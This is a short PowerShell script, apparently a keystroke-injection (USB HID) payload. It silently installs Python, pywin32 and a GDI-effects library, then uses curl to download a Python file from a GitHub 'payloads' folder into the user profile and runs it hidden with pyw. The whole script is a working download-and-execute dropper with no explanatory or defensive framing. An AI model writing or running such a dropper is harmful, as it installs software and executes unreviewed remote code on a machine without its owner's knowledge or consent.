$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) {
    winget install Python.Python.3 --accept-source-agreements --accept-package-agreements
    $python = Get-Command python -ErrorAction SilentlyContinue
}
python --version
$t1 = & python -c "import win32gui" 2>&1
if ($LASTEXITCODE -eq 0) {
}
else {
    python -m pip install pywin32
    $t1 = & python -c "import win32gui" 2>&1
}
$t2 = & python -c "from GDI_effects.GDI import *" 2>&1
if ($LASTEXITCODE -eq 0) {
}
else {
    python -m pip install GDI-effects
    $t2 = & python -c "from GDI_effects.GDI import *" 2>&1
}

curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output (Join-Path $env:USERPROFILE 'gdi1.py')
Start-Process (pyw (Join-Path $env:USERPROFILE 'gdi1.py'))
exit
